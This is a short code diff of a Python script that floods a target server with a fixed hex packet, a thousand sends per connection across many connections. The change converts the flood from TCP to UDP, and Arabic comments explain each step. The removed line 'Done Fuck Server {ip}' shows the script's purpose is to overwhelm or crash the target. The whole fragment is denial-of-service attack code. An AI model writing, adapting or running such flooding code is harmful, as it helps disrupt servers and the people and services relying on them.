@@ -9,14 +9,12 @@ packet = bytes.fromhex("F10400010900000001000000F2")
 num_send_per_connection = 1000
 
 for _ in range(num_connections):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:  # تغيير البروتوكول إلى UDP
         try:
-            s.connect((ip, port))
-            
             for _ in range(num_send_per_connection):
-                s.sendall(packet)
+                s.sendto(packet, (ip, port))  # استخدام sendto لإرسال البيانات مع UDP
             
-            print(f"Done Fuck Server {ip} <3")
+            print(f"Sent packets to {ip}:{port}")
         except Exception as e:
             print(f"Error: {e}")
 
